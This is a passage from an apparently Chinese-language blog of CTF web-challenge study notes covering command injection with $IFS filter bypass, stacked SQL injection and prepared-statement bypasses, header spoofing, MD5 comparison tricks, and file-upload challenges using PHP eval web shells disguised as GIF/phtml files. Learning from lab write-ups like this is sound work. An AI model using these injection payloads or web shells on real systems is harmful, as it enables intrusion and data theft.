class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">PING www.gwwafz.online (39.105.15.250): 56 data bytes<br><br>--- www.gwwafz.online ping statistics ---<br>3 packets transmitted, 0 packets received, 100% packet loss<br></code></pre></td></tr></table></figure><p>故想起使用管道符来连接命令:<br>39.105.15.250|ls &#x2F;  </p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tcl">bin<br>dev<br>etc<br>flag<br>home<br>lib<br>media<br>mnt<br>opt<br><span class="hljs-keyword">proc</span><span class="hljs-title"></span><br><span class="hljs-title">root</span><br>run<span class="hljs-title"></span><br><span class="hljs-title">sbin</span><br>srv<span class="hljs-title"></span><br><span class="hljs-title">sys</span><br>tmp<span class="hljs-title"></span><br><span class="hljs-title">usr</span><br>var<br></code></pre></td></tr></table></figure><p>直接回显了，那接下来就是cat &#x2F;flag 就ok了：</p><p>flag{eba95874-05c1-46a8-8a2f-28eff48a72be}</p><hr><h2 id="title-note-26date-2025-04-15-22-42-32tags"><a href="#title-note-26date-2025-04-15-22-42-32tags" class="headerlink" title="title: note-26date: 2025-04-15 22:42:32tags:"></a>title: note-26<br>date: 2025-04-15 22:42:32<br>tags:</h2><h1 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h1><p>根据提示</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=1<br></code></pre></td></tr></table></figure><p>根据回复，那就是ping功能了，<br>尝试用管道符连接命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=1|ls<br><br>flag.php<br>index.php<br></code></pre></td></tr></table></figure><p>直接就有flag，然后发现过滤了空格和flag,<br>上网查如何绕过空格过滤<br>最后使用$IFS$1</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-operator">?</span>ip<span class="hljs-operator">=</span><span class="hljs-number">1</span>|cat$IFS$<span class="hljs-number">1</span>index.php<br><br><span class="hljs-operator">/</span><span class="hljs-operator">?</span>ip<span class="hljs-operator">=</span><br>|\&#x27;|\<span class="hljs-string">&quot;|<span class="hljs-char escape_">\\</span>|<span class="hljs-char escape_">\(</span>|<span class="hljs-char escape_">\)</span>|<span class="hljs-char escape_">\[</span>|<span class="hljs-char escape_">\]</span>|<span class="hljs-char escape_">\&#123;</span>|<span class="hljs-char escape_">\&#125;</span>/&quot;</span>, $ip, $match))&#123;<br>    echo preg_match(<span class="hljs-string">&quot;/<span class="hljs-char escape_">\&amp;</span>|<span class="hljs-char escape_">\/</span>|<span class="hljs-char escape_">\?</span>|<span class="hljs-char escape_">\*</span>|<span class="hljs-char escape_">\&lt;</span>|[<span class="hljs-char escape_">\x</span>&#123;00&#125;-<span class="hljs-char escape_">\x</span>&#123;20&#125;]|<span class="hljs-char escape_">\&gt;</span>|<span class="hljs-char escape_">\&#x27;</span>|<span class="hljs-char escape_">\&quot;</span>|<span class="hljs-char escape_">\\</span>|<span class="hljs-char escape_">\(</span>|<span class="hljs-char escape_">\)</span>|<span class="hljs-char escape_">\[</span>|<span class="hljs-char escape_">\]</span>|<span class="hljs-char escape_">\&#123;</span>|<span class="hljs-char escape_">\&#125;</span>/&quot;</span>, $ip, $match);<br>    die(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  $a <span class="hljs-operator">=</span> shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.$ip);<br>  echo <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>  print_r($a);<br>&#125;<br><br><span class="hljs-operator">?</span><span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p>没坚持下去，去找wp了<br><a href="https://blog.csdn.net/qq_51439282/article/details/113378868">https://blog.csdn.net/qq_51439282/article/details/113378868</a><br>最后选了内联法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$1</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><p>记一下<br><a href="https://blog.csdn.net/angaoux03775/article/details/101710776">https://blog.csdn.net/angaoux03775/article/details/101710776</a><br><a href="https://blog.csdn.net/m0_52425873/article/details/124899793">https://blog.csdn.net/m0_52425873/article/details/124899793</a></p><hr><h2 id="title-note-27date-2025-04-17-11-01-54tags-note"><a href="#title-note-27date-2025-04-17-11-01-54tags-note" class="headerlink" title="title: note-27date: 2025-04-17 11:01:54tags: note"></a>title: note-27<br>date: 2025-04-17 11:01:54<br>tags: note</h2><h1 id="2019-review-强网杯-随便注"><a href="#2019-review-强网杯-随便注" class="headerlink" title="2019 review-强网杯-随便注"></a>2019 review-强网杯-随便注</h1><p>再做一遍</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;show tables#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;#<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;select group_concat(culumn_name);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br><span class="hljs-string"></span><br><span class="hljs-string">0&#x27;</span>;extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-keyword">database</span>()));#<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;if(1=1,sleep(5),0);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">or</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,version()))  # <br>!<span class="hljs-number">10.3</span><span class="hljs-number">.18</span>-MariaDB<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;or extractvalue(1,concat(&#x27;</span>!<span class="hljs-string">&#x27;,version()))  # </span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> words <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">COLUMN</span> flag <span class="hljs-keyword">TO</span> id;#<br>//没改成功，看返回大概是说找不到名为<span class="hljs-string">&#x27;id&#x27;</span>的<span class="hljs-keyword">column</span>,<span class="hljs-keyword">column</span>是行还是列来着？是列我朝<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;rename table words to words1;ALTER TABLE employees CHANGE flag id VARCHAR(50);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> words CHANGE flag id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>);#<br>//成功<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;<br>&#x2F;&#x2F;</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">语句背景分析：<br>这段 SQL 包含多个操作，核心目的是：<br><br>将表 <span class="hljs-built_in">words</span> 重命名为 words1。<br><br>将表 <span class="hljs-number">1919810931114514</span> 重命名为 <span class="hljs-built_in">words</span>。<br><br>修改新表 <span class="hljs-built_in">words</span> 的字段 flag，将其重命名为 <span class="hljs-built_in">id</span>，并更改其数据类型为 varchar(<span class="hljs-number">50</span>)。<br></code></pre></td></tr></table></figure><p>想不起当初的做题笔记了，只是看到正则的情况想到了改表明和列明，应该只是单纯的想起，因为连列名都忘了查</p><p>当时还记了其它绕过方法，<br>试一下预编译绕过</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables name;</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;show columns from `<span class="hljs-number">1919810931114514</span>`;<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">6</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;flag&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;varchar(100)&quot;</span><br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;NO&quot;</span><br>  [<span class="hljs-number">3</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  [<span class="hljs-number">4</span>]=&gt;<br>  NULL<br>  [<span class="hljs-number">5</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>1’;prepare hack from concat(‘sele’,’ct’,’* from <code>1919810931114514</code>‘);exectue hack;@<br>&#x2F;&#x2F;不是，明明一模一样，为啥我手敲的执行不了<br>&#x2F;&#x2F;1’;prepare hack from concat(‘sele’,’ct’,’* from  <code>1919810931114514</code>‘);execute hack;#<br>&#x2F;&#x2F;woc，原来是excute</p><p>1’;prepare hack from concat(‘sele’,’ct’,’* from <code>1919810931114514</code>‘);execute hack;@</p><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>根据提示<br>f12 搜索secret，找到：<br><a href="http://node5.buuoj.cn:27381/Secret.php">http://node5.buuoj.cn:27381/Secret.php</a><br>然后就是根据提示改请求头，  </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Access-Control-Allow-Origin:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">From:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">Referer:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-symbol">//Please</span> use <span class="hljs-string">&quot;Syclover&quot;</span> browser<br><br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">Browser :</span> Syclover<br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">User-Agent:</span> Syclover<br><br><span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Syclover Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-operator">//</span>No<span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span> you can only read this locally<span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">From :</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">X-Forwarded-For :</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-operator">//</span>flag&#123;<span class="hljs-number">41</span>cea244-<span class="hljs-number">340</span>a-<span class="hljs-number">4</span>be9-bd6e-ba42db379119&#125;<br></code></pre></td></tr></table></figure><p>有点当初BuildCTF里的一题，但是那道题要改的更多</p><hr><h2 id="title-note-28date-2025-04-17-22-35-50tags-note"><a href="#title-note-28date-2025-04-17-22-35-50tags-note" class="headerlink" title="title: note-28date: 2025-04-17 22:35:50tags: note"></a>title: note-28<br>date: 2025-04-17 22:35:50<br>tags: note</h2><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>在bp查看相应，看到：<br>hint: select * from ‘admin’ where password&#x3D;md5($pass,true)<br>试一下ffifdyop<br>返回的页面中有：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">$a = $GET[&#x27;a&#x27;];</span><br><span class="hljs-comment">$b = $_GET[&#x27;b&#x27;];</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="hljs-comment">    // wow, glzjin wants a girl friend.</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure><p>不是怎么都在求girlfriend,<br>这个我猜能用数组绕过</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?a=r[]&amp;b=<span class="hljs-string">q[]</span><br>//不行<br>?a=<span class="hljs-string">&#x27;1&#x27;</span>&amp;b=<span class="hljs-number">1</span><br>//<span class="hljs-keyword">no</span><br></code></pre></td></tr></table></figure><p>那直接上网查md5加密后能弱等于的字符</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">?a=%271%27&amp;&amp;b=<span class="hljs-number">1</span><br><span class="hljs-comment">//ok</span><br></code></pre></td></tr></table></figure><p>返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个强不等于试一下’1’,1</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">param1=<span class="hljs-number">1</span><span class="hljs-variable">&amp;param2</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-comment">//no</span><br><br>param1[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;param2</span>[]=<span class="hljs-number">2</span><br><span class="hljs-comment">// flag&#123;8277b79d-033f-4f57-a8dd-d74d41893128&#125; </span><br><span class="hljs-comment">//原来我刚才用的数组绕过是写错的啊😅</span><br><span class="hljs-comment">//试了一下，levels91.php和levell14.php，都能直接用数组绕过</span><br></code></pre></td></tr></table></figure><h2 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h2><p>sql中md5的万能密码<br><a href="https://blog.csdn.net/Jeff_12138/article/details/121847582">https://blog.csdn.net/Jeff_12138/article/details/121847582</a></p><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>正常穿了一次图片，显示了上传文件的储存目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/uplo4d/</span><br></code></pre></td></tr></table></figure><p>上网随便找个php一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;hack&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先把后最改为png在前端页面上传，或者直接改前端<br>然后用bp把后缀名改为php上传<br>提示nono  </p><p>后把后缀改为 .phtml<br>成功上传<br>最后蚁剑连接，在根目录发现flag  </p><h2 id="phtml-绕过"><a href="#phtml-绕过" class="headerlink" title="phtml 绕过"></a>phtml 绕过</h2><p>将文件后缀改为 .phtml，在 Apache 服务器上会被当作 PHP 文件执行。  </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">file</span>.phtml<br></code></pre></td></tr></table></figure><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>记录一下心路历程：<br>一开始以为是sql，然后看到前端代码里提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">you are not admin <br></code></pre></td></tr></table></figure><p>以为是cookie，把初始的cookie解base64后好像出了个json格式的啥，试着把里面的”1”改为”admin”，<br>没用。<br>随后注册了一个账户，想起了数据库污染啥的，但是这题不是<br>注册账户后登录，然后更改密码，</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">123</span>&#x27;<span class="hljs-keyword">where</span> username=admin<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>然后用123来登录admin，拿到flag<br>没想到一次成了</p><hr><h2 id="title-note-29date-2025-04-21-18-12-17tags-note"><a href="#title-note-29date-2025-04-21-18-12-17tags-note" class="headerlink" title="title: note-29date: 2025-04-21 18:12:17tags: note"></a>title: note-29<br>date: 2025-04-21 18:12:17<br>tags: note</h2><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;php.phtml&quot;</span><br>Content-Type: image/jpeg<br><br>GIF89a<br><br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;z&quot;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>显示上传成功，但是没找到目录在哪<br>在url试了一下<br>在这个目录  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/upload/</span>php.phtml<br></code></pre></td></tr></table></figure><p>试了好久发现马没生效</p><p>上网找了一个文件头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;text.phtml&quot;</span><br>Content-Type: image/jpeg<br><br>GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);&lt;/script&gt;<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>from:<a href="https://blog.csdn.net/m0_55793759/article/details/120956861">https://blog.csdn.net/m0_55793759/article/details/120956861</a><br>成功</p><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>网址备份没思路，便上网查：<br><a href="https://blog.csdn.net/m0_62879498/article/details/124129841">https://blog.csdn.net/m0_62879498/article/details/124129841</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">常见的网站源码备份文件后缀:<br><br>tar.gz，<span class="hljs-built_in">zip</span>，rar，tar<br><br>常见的网站源码备份文件名：<br><br>web，website，backup，back，www，wwwroot，temp<br><br>后用<br>www.<span class="hljs-built_in">zip</span>下载备份源码<br></code></pre></td></tr></table></figure><p>里面有个flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>假flag，，，<br>审计index.php，<br>好像是反序列化？  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs 